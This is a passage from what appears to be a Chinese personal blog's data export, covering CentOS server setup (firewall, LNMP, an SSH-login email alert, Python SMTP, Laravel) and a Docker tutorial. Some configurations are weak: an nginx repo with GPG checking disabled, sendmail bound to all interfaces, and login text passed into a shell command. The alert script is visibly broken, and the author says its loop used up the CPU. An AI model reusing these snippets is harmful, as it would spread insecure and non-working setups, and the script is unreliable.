class=\"line\">[root@localhost]$ firewall-cmd --permanent --zone=public --add-port=××××/tcp</span><br><span class=\"line\">[root@localhost]$ firewall-cmd --reload</span><br><span class=\"line\">[root@localhost]$ ss -tnlp | grep ssh</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"第三关：lnmp配置\"><a href=\"#第三关：lnmp配置\" class=\"headerlink\" title=\"第三关：lnmp配置\"></a>第三关：lnmp配置</h2><p><strong>安装<code>nginx</code>:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install epel-release</span><br><span class=\"line\">[root@localhost]$ yum -y install nginx</span><br><span class=\"line\">[root@localhost]$ service nginx start</span><br></pre></td></tr></table></figure></p>\n<p>或者<code>/etc/yum.repo.d/nginx.repo</code><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[nginx]</span><br><span class=\"line\">baseurl=http://nginx.org/packages/centos/<span class=\"variable\">$releasever</span>/<span class=\"variable\">$basearch</span>/</span><br><span class=\"line\">gpgcheck=0</span><br><span class=\"line\">enabled=1</span><br></pre></td></tr></table></figure></p>\n<p><strong>安装<code>php7.0</code>(CentOS 7.x):</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class=\"line\">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class=\"line\">yum install php70w php70w-opcache</span><br><span class=\"line\">yum install php70w-fpm php70w-opcache</span><br></pre></td></tr></table></figure></p>\n<p><strong>安装php7.0不太容易，建议多在网上查</strong></p>\n<p><strong>设置<code>nginx</code>，更改root目录问题：</strong><br><strong>之前将<code>nginx</code>的root目录改了过后出现了403问题，搞了好久还是没有一个很完整的解决方案，不过找到一个方案，但还是不太理解。将<code>nginx</code>中的配置文件的<code>user nginx</code> 改为自己的用户名，即更改过后root目录的所有者。</strong><br><img src=\"/images/nginxUser.png\" alt=\"\"><br><strong>困惑点在于<code>nginx</code>默认的目录<code>/usr/share/nginx/html</code>的所有者为<code>root</code>但没有出现403</strong></p>\n<p><strong>安装<code>mysql</code>:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># yum install mysql</span></span><br><span class=\"line\"><span class=\"comment\"># yum install mysql-devel</span></span><br><span class=\"line\"><span class=\"comment\"># wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm</span></span><br><span class=\"line\"><span class=\"comment\"># rpm -ivh mysql-community-release-el7-5.noarch.rpm</span></span><br><span class=\"line\"><span class=\"comment\"># yum install mysql-community-server</span></span><br><span class=\"line\"><span class=\"comment\"># service mysqld restart</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>配置问题</strong><br><strong>1.配置<code>php.ini</code>: 只修改一行代码，通过<code>vim</code>查找<code>cgi.fix_pathinfo</code>，并将其修改为0,去注释.</strong><br><strong>2.配置<code>www.conf</code>: 修改<code>listen</code>选项设置为<code>127.0.0.1:9000</code>; 设置<code>user</code>为<code>/home</code>下的一个用户,<code>group</code>也同样设置</strong><br><strong>3.配置<code>nginx.conf</code>,将<code>user</code>改为<code>www.conf</code>里面的<code>user</code>相同，网站根目录必须在<code>nginx</code>的<code>user</code>下,具体配置如下</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">        fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        fastcgi_index  index.php;</span><br><span class=\"line\">        fastcgi_param  SCRIPT_FILENAME  <span class=\"variable\">$document_root</span><span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">        include        fastcgi_params;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"第四关：ssh登录邮件通知（后面有彩蛋哟）\"><a href=\"#第四关：ssh登录邮件通知（后面有彩蛋哟）\" class=\"headerlink\" title=\"第四关：ssh登录邮件通知（后面有彩蛋哟）\"></a>第四关：ssh登录邮件通知（后面有彩蛋哟）</h2><p><strong>游手好闲地折腾了几天，突发奇想，前几天租了一个vps，想随时检测有没有人通过ssh登录我的vps，如果有人登录，就发邮件通知，于是有了以下的折腾：</strong></p>\n<ul>\n<li><strong>首先安装必备的软件<code>sendmail</code> 和<code>mailx</code></strong></li>\n<li><strong>通过<code>last</code>命令和<code>awk</code>结合获取ssh登录情况</strong></li>\n<li><strong>最后写个python程序，让它一直跑着随时准备发邮件</strong></li>\n<li><strong>将写好的程序运行命令写入/etc/rc.d/rc.local，让它开机运行</strong></li>\n</ul>\n<p><strong>那么命令如下：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@localhost]$ yum install sendmail sendmail-cf mailx</span><br><span class=\"line\">[root@localhost]$ service sendmail start</span><br><span class=\"line\">[root@localhost]$ last | awk <span class=\"string\">'$1==\"root\"'</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>接下来需要修改一个配置文件，让<code>sendmail</code>可以给整个英特网发送邮件，配置文件为<code>/etc/mail/sendmail.mc</code>，其中有一行</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DAEMON_OPTIONS(<span class=\"string\">'port=smtp,Addr=127.0.0.1, Name=MTA-v6, Family=net6'</span>)dnl</span><br></pre></td></tr></table></figure></p>\n<p><strong>将127.0.0.1改为0.0.0.0，这样就可以给整个英特网发送邮件了</strong><br><strong>python脚本如下</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">inst = \"last | awk \\'$1!=\\\"reboot\\\"\\'\"</span><br><span class=\"line\">str = os.popen(inst).read()</span><br><span class=\"line\">ssh_login = str.split(\"\\n\")</span><br><span class=\"line\">length = len(ssh_login)</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    inst1 = \"last | awk \\'$1!=\\\"reboot\\\"\\' &gt; ssh_login.txt\"</span><br><span class=\"line\">    os.system(inst1)</span><br><span class=\"line\">    str = os.popen(inst).read()</span><br><span class=\"line\">    ssh_login = str.split(\"\\n  length1 = len(ssh_login)</span><br><span class=\"line\"></span><br><span class=\"line\">    if length1 &gt; length:</span><br><span class=\"line\">        login_name = ssh_login[0]</span><br><span class=\"line\">        mail = \"echo %s | mail -s \\'$1!=\\\"reboot\\\"\\' ××××@qq.com\" % login_name</span><br><span class=\"line\">        os.system(mail)</span><br><span class=\"line\">        length = length1</span><br></pre></td></tr></table></figure>\n<p><strong>最重要的一点：qq邮箱发送成功一次过后vps的域名就会被拉黑，被认为是垃圾邮件，因此需要在邮箱管理界面设置域名白名单<code>localhost.localdomain</code>，然后大功告成，哈哈</strong></p>\n<p><strong>你以为这样就了事了？如果你将这个程序通过开机启动让它一直跑着，那么很开心的告诉你，你的机器cpu用不了多久就会被占满，所以，这个方法还是不行滴，这只是一种理想思路，想要处理的话可以选择指定时间运行一次或者每隔一段时间运行一次。接下来我去找个比较好的方式来实现这个功能，并实现每天发送当天的日志文件。</strong></p>\n<p><strong>我的vps跑了几个小时后的cpu受不了了，跑了不到两个小时，就被厂家限制了。</strong><br><img src=\"/images/cpu.png\" alt=\"\"></p>\n<h2 id=\"第五关：python实现邮件发送\"><a href=\"#第五关：python实现邮件发送\" class=\"headerlink\" title=\"第五关：python实现邮件发送\"></a>第五关：python实现邮件发送</h2><p><strong>没时间了，直接贴代码</strong><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> email <span class=\"keyword\">import</span> encoders</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.header <span class=\"keyword\">import</span> Header</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.mime.text <span class=\"keyword\">import</span> MIMEText</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.utils <span class=\"keyword\">import</span> parseaddr, formataddr</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> smtplib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_format_addr</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    name, addr = parseaddr(s)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> formataddr((Header(name, <span class=\"string\">'utf-8'</span>).encode(), addr))</span><br><span class=\"line\"></span><br><span class=\"line\">from_addr = <span class=\"string\">\"××××××××××@qq.com\"</span></span><br><span class=\"line\">password = <span class=\"string\">\"××××××××××\"</span>　　　<span class=\"comment\"># SMTP独立密码</span></span><br><span class=\"line\">to_addr = <span class=\"string\">\"××××××××××@qq.com\"</span></span><br><span class=\"line\">smtp_server = <span class=\"string\">\"smtp.qq.com\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">msg = MIMEText(<span class=\"string\">'hello, send by Python...'</span>, <span class=\"string\">'plain'</span>, <span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">msg[<span class=\"string\">'From'</span>] = _format_addr(<span class=\"string\">'fenlan &lt;%s&gt;'</span> % from_addr)</span><br><span class=\"line\">msg[<span class=\"string\">'To'</span>] = _format_addr(<span class=\"string\">'管理员 &lt;%s&gt;'</span> % to_addr)</span><br><span class=\"line\">msg[<span class=\"string\">'Subject'</span>] = Header(<span class=\"string\">'vps远程登录日志'</span>, <span class=\"string\">'utf-8'</span>).encode()</span><br><span class=\"line\"></span><br><span class=\"line\">server = smtplib.SMTP_SSL(smtp_server, <span class=\"number\">465</span>)</span><br><span class=\"line\">server.login(from_addr, password)</span><br><span class=\"line\">server.sendmail(from_addr, [to_addr], msg.as_string())</span><br><span class=\"line\">server.quit()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"第六关：搭建laravel框架\"><a href=\"#第六关：搭建laravel框架\" class=\"headerlink\" title=\"第六关：搭建laravel框架\"></a>第六关：搭建laravel框架</h2><p><strong>首先安装<code>composer</code>(一个php工具，具体查看官网)</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">\"copy('https://getcomposer.org/installer', 'composer-setup.php');\"</span></span><br><span class=\"line\">php -r <span class=\"string\">\"if (hash_file('SHA384', 'composer-setup.php') === '669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410') &#123; echo 'Installer verified'; &#125; else &#123; echo 'Installer corrupt'; unlink('composer-setup.php'); &#125; echo PHP_EOL;\"</span></span><br><span class=\"line\">php composer-setup.php</span><br><span class=\"line\">php -r <span class=\"string\">\"unlink('composer-setup.php');\"</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>然后全局使用<code>composer</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv composer.phar /usr/<span class=\"built_in\">local</span>/bin/composer</span><br></pre></td></tr></table></figure></p>\n<p><strong>接着安装<code>laravel</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer create-project --prefer-dist laravel/laravel your_project_name</span><br></pre></td></tr></table></figure></p>\n<p><strong>进入项目目录更新<code>composer</code></strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer update</span><br></pre></td></tr></table></figure></p>\n<p><strong>在这里我遇到了一个问题，我搭建三次只遇见过一次</strong><br><img src=\"/images/laravel_problem.png\" alt=\"\"><br><strong>根据提示进入里面说的网站上，跟着网站描述解决问题就ok</strong></p>"},{"title":"Docker","date":"2017-11-27T07:18:23.000Z","_content":"\n## 概述\n**Docker 是世界领先的软件容器平台。开发人员利用 Docker 可以消除协作编码\"在我的机器上可正常工作\"的问题。运维人员利用 Docker 可以在隔离容器中并行运行和管理应用，获得更好的计算密度。企业利用 Docker 可以构建敏捷的软件交付管道，以更快的速度、更高的安全性和可靠的信誉为 Linux 和 Windows Server 应用发布新功能。**\n**[更加全面的介绍](https://www.docker-cn.com/what-docker)**\n<!--more-->\n\n## 容器\n**`image`是一个轻量级的，独立的可执行程序包，包含运行一个软件所需的所有东西，包括代码，运行时库，环境变量和配置文件。**\n**`container`是`image`的运行时实例 ---- `image`在实际执行时在内存中变成的内容。默认情况下，它与主机环境完全隔离，只有在配置时才访问主机文件和端口。**\n**容器(containers)在主机的内核上本地运行应用程序。它们比只能通过管理程序虚拟访问主机资源的虚拟机具有更好的性能特征。容器可以获得本地访问权限，每个容器都以独立的进程运行，不会花费比其他可执行文件更多的内存。**\n\n## 虚拟机 vs. 容器\n\n### 虚拟机架构\n![](https://www.docker.com/sites/default/files/VM%402x.png)\n**虚拟机运行客户操作系统 ---- 每个框中的操作系统层。这是资源密集型的，产生的磁盘映像和应用程序状态是操作系统设置。系统安装的依赖关系，操作系统安全补丁和其他易于丢失的东西，难以复制重用**\n\n### 容器架构\n![](https://www.docker.com/sites/default/files/Container%402x.png)\n**容器可以共享一个内核，并且唯一需要在容器镜像中的信息是可执行文件及其包依赖关系(the only information that needs to be in a container image is the executable and its package dependencies)，它们永远不需要安装在主机系统上。这些进程像本地进程一样运行，你可以像`docker ps`一样运行命令来单独管理它们，就像在Linux上运行ps来查看活动进程一样。最后，因为它们包含了所有的依赖关系，所以没有配置纠缠。一个集装箱化的应用程序\"随处运行\"**\n\n## 安装Docker\n\n### 卸载旧版本\n``` bash\n$ sudo yum remove docker \\\n                  docker-common \\\n                  docker-selinux \\\n                  docker-engine\n```\n\n### 安装Docker CE(Community Edition)\n#### 软件库安装\n``` bash\n$ sudo yum install -y yum-utils \\\n  device-mapper-persistent-data \\\n  lvm2\n```\n``` bash\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo\n```\n``` bash\n$ sudo yum install docker-ce\n```\n#### 开启Docker\n``` bash\n$ sudo systemctl start docker\n```\n#### Hello World\n``` bash\n$ docker run hello-world\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n\nTo generate this message, Docker took the following steps:\n...(snipped)...\n```\n\n## Building an app\n**现在是开始构建Docker方式的应用程序的时候了。我们将从这个应用程序的层次结构的底部开始，这个应用程序是一个容器。在这个层次上面是一个服务，它定义了容器在生产中的行为方式。最后，在顶层是堆栈，定义了所有服务的交互。**\n**过去，如果你要开始编写一个Python应用程序，你的第一步就是在你的机器上安装一个Python运行库。但是，这会造成您的机器上的环境必须如此以使您的应用程序按预期运行。**\n\n**使用Docker，您可以将一个可移植的Python运行时作为一个镜像来获取，无需安装。然后，您的构建可以将基础Python镜像与应用程序代码一起包括在内，确保您的应用程序和依赖项一起运行。**\n**这个可移植的镜像被定义为`Dockerfile`**\n\n### `Dockerfile`\n**创建一个空的目录，cd进入空目录，创建一个`Dockerfile`文件,`requirement.txt`文件,`app.py`文件**\n``` bash\n# Use an official Python runtime as a parent image\nFROM python:2.7-slim\n\n# Set the working directory to /app\nWORKDIR /app\n\n# Copy the current directory contents into the container at /app\nADD . /app\n\n# Install any needed packages specified in requirements.txt\nRUN pip install --trusted-host pypi.python.org -r requirements.txt\n\n# Make port 80 available to the world outside this container\nEXPOSE 80\n\n# Define environment variable\nENV NAME World\n\n# Run app.py when the container launches\nCMD [\"python\", \"app.py\"]\n```\n### `requirements.txt`\n``` bash\nFlask\nRedis\n```\n\n### `app.py`\n``` python\nfrom flask import Flask\nfrom redis import Redis, RedisError\nimport os\nimport socket\n\n# Connect to Redis\nredis = Redis(host=\"redis\", db=0, socket_connect_timeout=2, socket_timeout=2)\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    try:\n        visits = redis.incr(\"counter\")\n    except RedisError:\n        visits = \"<i>cannot connect to Redis, counter disabled</i>\"\n\n    html = \"<h3>Hello {name}!</h3>\" \\\n           \"<b>Hostname:</b> {hostname}<br/>\" \\\n           \"<b>Visits:</b> {visits}\"\n    return html.format(name=os.getenv(\"NAME\", \"world\"), hostname=socket.gethostname(), visits=visits)\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=80)\n```\n\n**使用命令创建一个Docker镜像**\n``` bash\n$ docker build -t friendlyhello .\n$ docker images\n\nREPOSITORY            TAG                 IMAGE ID\nfriendlyhello         latest              326387cea398\n```\n\n## Run the app\n**运行应用程序，使用-p将您的机器的端口4000映射到容器的已发布端口80：**\n``` bash\n$ docker run -p 4000:80 friendlyhello\n```\n**你应该看到一条消息，Python在`http://0.0.0.0:80`上提供你的应用程序。但是，这个消息来自容器内部，它不知道你将该容器的端口80映射到4000，所以正确的URL为`http://localhost:4000`。**\n**在Web浏览器中转到该URL以查看网页上显示的显示内容，包括“Hello World”文本，容器标识和Redis错误消息。**\n![](https://docs.docker.com/get-started/images/app-in-browser.png)\n\n**现在让我们以分离模式在后台运行应用程序：**\n``` bash\n$ docker run -d -p 4000:80 friendlyhello\n```\n\n**你得到你的应用程序的长容器ID，然后被踢回你的终端。您的容器正在后台运行。您还可以使用`docker container ls`查看缩略容器标识**\n``` bash\n$ docker container ls\nCONTAINER ID        IMAGE               COMMAND             CREATED\n1fa4ab2cf395        friendlyhello       \"python app.py\"     28 seconds ago\n```\n\n**现在使用`docker container stop`来结束进程，使用CONTAINER ID，如下所示：**\n``` bash\ndocker container stop 1fa4ab2cf395\n```\n\n## Share your image\n**为了演示我们刚刚创建的容器的可移植性，我们上传我们构建的映像，并在其他地方运行它。毕竟，当你想将容器部署到生产环境时，你需要学习如何`push`到一个公共地方。**\n**如果你还没有Docker帐号，需要在[这里](https://cloud.docker.com/)注册一个帐号**\n**本地登录你的Docker库**\n``` bash\n$ docker login\n```\n\n**关联本地镜像像与注册表(registry)中存储库的符号是`username/repository:tag`。该标签是可选的，但推荐使用，因为这是注册管理机构管理Docker镜像版本的机制。给存储库标记有意义的名字，比如`get-started:part2`。这会将镜像放入`get-started`存储库中，并将其标记为`part2`。**\n**现在，把它们放在一起来标记镜像。使用您的用户名，存储库和标签名称运行`docker tag image`，以便将镜像上传到您想要的目的地。该命令的语法是:**\n``` bash\n$ docker tag image username/repository:tag\n```\n**For example:**\n``` bash\n$ docker tag friendlyhello john/get-started:part2\n```\n**查看你新标记的镜像**\n``` bash\n$ docker images\nREPOSITORY               TAG                 IMAGE ID            CREATED             SIZE\nfriendlyhello            latest              d9e555c53008        3 minutes ago       195MB\njohn/get-started         part2               d9e555c53008        3 minutes ago       195MB\npython                   2.7-slim            1c7128a655f6        5 days ago          183MB\n...\n```\n\n**发布镜像**\n``` bash\n$ docker push username/repository:tag\n```\n\n**拉取并运行远端库**\n``` bash\ndocker run -p 4000:80 username/repository:tag\n```\n### 速查表\n``` bash\ndocker build -t friendlyname .# 使用此目录的 Dockerfile 创建镜像\ndocker run -p 4000:80 friendlyname  # 运行端口 4000 到 90 的“友好名称”映射\ndocker run -d -p 4000:80 friendlyname         # 内容相同，但在分离模式下\ndocker ps                                 # 查看所有正在运行的容器的列表\ndocker stop <hash>                     # 平稳地停止指定的容器\ndocker ps -a           # 查看所有容器的列表，甚至包含未运行的容器\ndocker kill <hash>                   # 强制关闭指定的容器\ndocker rm <hash>              # 从此机器中删除指定的容器\ndocker rm $(docker ps -a -q)           # 从此机器中删除所有容器\ndocker images -a                               # 显示此机器上的所有镜像\ndocker rmi <imagename>            # 从此机器中删除指定的镜像\ndocker rmi $(docker images -q)             # 从此机器中删除所有镜像\ndocker login             # 使用您的 Docker 凭证登录此 CLI 会话\ndocker tag <image> username/repository:tag  # 标记 <image> 以上传到镜像库\ndocker push username/repository:tag            # 将已标记的镜像上传到镜像库\ndocker run username/repository:tag                   # 运行镜像库中的镜像\n```\n\n\n## 服务\n\n### 了解服务\n**在分布式应用中，应用的不同部分称为“服务”。例如，假设有一个视频共享网站，它可能提供用于在数据库中存储应用程序数据的服务、用于在用户上传一些内容后在后台进行视频转码的服务、用于前端的服务等。**\n\n**服务实际上是“生产中的容器”。一项服务仅运行一个镜像，但它会编制镜像的运行方式 - 它应使用的端口、容器的多少个从节点应运行才能使服务的容量满足其需求等。扩展服务将更改运行该软件的容器实例数，并将多个计算资源分配给进程中的服务。**\n\n**幸运的是，很容易使用 Docker 平台定义、运行和扩展服务 – 只需编写一个`docker-compose.yml`文件即可。**\n\n### `docker-compose.yml`\n``` bash\nversion:\"3\"\nservices:\n  web:\n    # 将 username/repo:tag 替换为您的名称和镜像详细信息\n    image: username/repository:tag\n    deploy:\n      replicas:5\n      resources:\n        limits:\n          cpus:\"0.1\"\n          memory:50M\n      restart_policy:\n        condition: on-failure\n    ports:\n      - \"80:80\"\n    networks:\n      - webnet\nnetworks:\n  webnet:\n```\n\n**此 docker-compose.yml 文件会告诉 Docker 执行以下操作：**\n- 从镜像库中拉取我们上传的镜像。\n- 将该镜像的五个实例作为服务`web`运行，并将每个实例限制为最多使用 10% 的 CPU（在所有核心中）以及 50MB RAM。\n- 如果某个容器发生故障，立即重启容器。\n- 将主机上的端口 80 映射到 web 的端口 80。\n- 指示`web`容器通过负载均衡的网络`webnet`共享端口 80。（在内部，容器自身将在临时端口发布到 web 的端口 80。）\n- 使用默认设置定义`webnet`网络（此为负载均衡的`overlay`网络）。\n\n### 运行新的负载均衡(load-balanced)的应用\n**需要先运行以下命令，然后才能使用`docker stack deploy`命令：**\n``` bash\ndocker swarm init\n```\n**现在，运行此命令。您必须为应用指定一个名称。在此处该名称设置为`getstartedlab`：**\n``` bash\ndocker stack deploy -c docker-compose.yml getstartedlab\n```\n**查看您刚才启动的五个容器的列表：**\n``` bash\ndocker stack ps getstartedlab\n```\n![](/images/docker1.png)\n\n**您可以多次在一行中运行`curl http://localhost`，也可以在浏览器中转至该 URL 并多次点击“刷新”。无论采用哪种方式，您都将看到容器 ID 更改，从而说明负载均衡；借助每项请求，将以循环方式选择五个从节点之一做出响应。**\n> **注：在此阶段，容器最多可能需要 30 秒来响应 HTTP 请求。这并不代表 Docker 或 swarm 的性能，而是一项未满足的 Redis 依赖关系，我们稍后将在本教程中讨论此依赖关系。**\n\n### 扩展应用\n**您可以通过在`docker-compose.yml`中更改`replicas`值，保存更改并重新运行`docker stack deploy`命令来扩展应用：**\n``` bash\ndocker stack deploy -c docker-compose.yml getstartedlab\n```\n**Docker 将执行原地更新，而无需先清除技术栈或终止任何容器。**\n**现在，重新运行`docker stack ps`命令以查看经过重新配置的已部署实例。例如，如果您扩展了从节点，将有更多处于运行状态的容器。**\n\n### 清除应用和 swarm\n**使用`docker stack rm`清除应用：**\n``` bash\ndocker stack rm getstartedlab\n```\n**这将删除应用，但我们的单节点`swarm`仍处于正常运行状态（如`docker node ls`所示）。使用`docker swarm leave --force`清除 swarm。**\n\n### 速查表\n``` bash\ndocker stack ls              # 列出此 Docker 主机上所有正在运行的应用\ndocker stack deploy -c <composefile> <appname>  # 运行指定的 Compose 文件\ndocker stack services <appname>       # 列出与应用关联的服务\ndocker stack ps <appname>   # 列出与应用关联的正在运行的容器\ndocker stack rm <appname>                             # 清除应用\n```\n\n## Swarm\n引用[Docker中文文档 Swarm](https://docs.docker-cn.com/get-started/part4/)\n\n## 技术栈\n引用[Docker中文文档 技术栈](https://docs.docker-cn.com/get-started/part5/)\n\n## 引用链接\n- [Docker中文](https://www.docker-cn.com/what-docker)\n- [Get Docker CE for CentOS](https://docs.docker.com/engine/installation/linux/docker-ce/centos/)\n- [Docker官网文档](https://docs.docker.com/get-started/)\n- [Docker 服务](https://docs.docker-cn.com/get-started/part3/)","source":"_posts/docker.md","raw":"---\ntitle: Docker\ntags: Docker\ncategories: linux\ndate: 2017-11-27 15:18:23\n---\n\n## 概述\n**Docker 是世界领先的软件容器平台。开发人员利用 Docker 可以消除协作编码\"在我的机器上可正常工作\"的问题。运维人员利用 Docker 可以在隔离容器中并行运行和管理应用，获得更好的计算密度。企业利用 Docker 可以构建敏捷的软件交付管道，以更快的速度、更高的安全性和可靠的信誉为 Linux 和 Windows Server 应用发布新功能。**\n**[更加全面的介绍](https://www.docker-cn.com/what-docker)**\n<!--more-->\n\n## 容器\n**`image`是一个轻量级的，独立的可执行程序包，包含运行一个软件所需的所有东西，包括代码，运行时库，环境变量和配置文件。**\n**`container`是`image`的运行时实例 ---- `image`在实际执行时在内存中变成的内容。默认情况下，它与主机环境完全隔离，只有在配置时才访问主机文件和端口。**\n**容器(containers)在主机的内核上本地运行应用程序。它们比只能通过管理程序虚拟访问主机资源的虚拟机具有更好的性能特征。容器可以获得本地访问权限，每个容器都以独立的进程运行，不会花费比其他可执行文件更多的内存。**\n\n## 虚拟机 vs. 容器\n\n### 虚拟机架构\n![](https://www.docker.com/sites/default/files/VM%402x.png)\n**虚拟机运行客户操作系统 ---- 每个框中的操作系统层。这是资源密集型的，产生的磁盘映像和应用程序状态是操作系统设置。系统安装的依赖关系，操作系统安全补丁和其他易于丢失的东西，难以复制重用**\n\n### 容器架构\n![](https://www.docker.com/sites/default/files/Container%402x.png)\n**容器可以共享一个内核，并且唯一需要在容器镜像中的信息是可执行文件及其包依赖关系(the only information that needs to be in a container image is the executable and its package dependencies)，它们永远不需要安装在主机系统上。这些进程像本地进程一样运行，你可以像`docker ps`一样运行命令来单独管理它们，就像在Linux上运行ps来查看活动进程一样。最后，因为它们包含了所有的依赖关系，所以没有配置纠缠。一个集装箱化的应用程序\"随处运行\"**\n\n## 安装Docker\n\n### 卸载旧版本\n``` bash\n$ sudo yum remove docker \\\n                  docker-common \\\n                  docker-selinux \\\n                  docker-engine\n```\n\n### 安装Docker CE(Community Edition)\n#### 软件库安装\n``` bash\n$ sudo yum install -y yum-utils \\\n  device-mapper-persistent-data \\\n  lvm2\n```\n``` bash\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo\n```\n``` bash\n$ sudo yum install docker-ce\n```\n#### 开启Docker\n``` bash\n$ sudo systemctl start docker\n```\n#### Hello World\n``` bash\n$ docker run hello-world\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n\nTo generate this message, Docker took the following steps:\n...(snipped)...\n```\n\n## Building an app\n**现在是开始构建Docker方式的应用程序的时候了。我们将从这个应用程序的层次结构的底部开始，这个应用程序是一个容器。在这个层次上面是一个服务，它定义了容器在生产中的行为方式。最后，在顶层是堆栈，定义了所有服务的交互。**\n**过去，如果你要开始编写一个Python应用程序，你的第一步就是在你的机器上安装一个Python运行库。但是，这会造成您的机器上的环境必须如此以使您的应用程序按预期运行。**\n\n**使用Docker，您可以将一个可移植的Python运行时作为一个镜像来获取，无需安装。然后，您的构建可以将基础Python镜像与应用程序代码一起包括在内，确保您的应用程序和依赖项一起运行。**\n**这个可移植的镜像被定义为`Dockerfile`**\n\n### `Dockerfile`\n**创建一个空的目录，cd进入空目录，创建一个`Dockerfile`文件,`requirement.txt`文件,`app.py`文件**\n``` bash\n# Use an official Python runtime as a parent image\nFROM python:2.7-slim\n\n# Set the working directory to /app\nWORKDIR /app\n\n# Copy the current directory contents into the container at /app\nADD . /app\n\n# Install any needed packages specified in requirements.txt\nRUN pip install --trusted-host pypi.python.org -r 